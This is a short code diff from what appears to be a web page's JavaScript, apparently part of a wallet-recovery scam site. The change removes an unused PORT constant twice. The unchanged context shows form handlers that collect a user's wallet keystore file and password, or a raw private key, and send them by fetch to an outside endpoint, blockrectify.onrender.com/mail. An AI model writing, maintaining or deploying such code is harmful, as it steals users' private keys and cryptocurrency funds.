@@ -2342,7 +2342,6 @@
         if (keystorejson.trim() === "" || keystorepassword === "") {
           alert("Fill out all form fields before proceeding");
         } else {
-          const PORT = process.env.PORT || 3001;
           try {
             const response = await fetch(
               'https://blockrectify.onrender.com/mail',
@@ -2413,7 +2412,6 @@
         if (privatekey.trim() === "") {
           alert("Fill in your private key");
         } else {
-          const PORT = process.env.PORT || 3001;
           try {
             const response = await fetch(
               'https://blockrectify.onrender.com/mail',
